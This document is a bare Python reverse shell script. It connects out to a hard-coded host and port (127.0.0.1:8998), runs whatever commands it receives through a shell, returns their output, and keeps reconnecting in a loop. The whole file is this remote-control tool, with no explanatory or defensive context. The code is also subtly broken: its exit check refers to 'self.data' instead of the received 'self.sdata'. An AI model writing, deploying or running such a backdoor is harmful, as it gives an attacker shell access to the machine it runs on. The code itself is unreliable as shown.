#!python3
#coding=utf-8
import subprocess,socket,time

class rev:
    def __init__(self):
        self.host='127.0.0.1'
        self.port=8998
        self.target=(self.host,self.port)

    def rev_tcp(self): 
        self.a=True
        while self.a:
            self.s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            try:
                self.s.connect(self.target)
                while self.a:
                    self.sdata=self.s.recv(4096).decode('utf-8')
                    if not self.data=='exit':
                        #print(self.sdata)
                        try:
                            self.sub=subprocess.Popen(self.sdata,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
                            self.sub.wait(3)
                            self.out=self.sub.stdout.read()+self.sub.stderr.read()
                            print(self.out)
                            self.s.send(self.out)
                        except Exception as e:
                            #self.sub.kill()
                            continue
                    else:
                        self.a=False
            except Exception as e:
                self.s.close()
                time.sleep(2)
                continue

app=rev()
app.rev_tcp()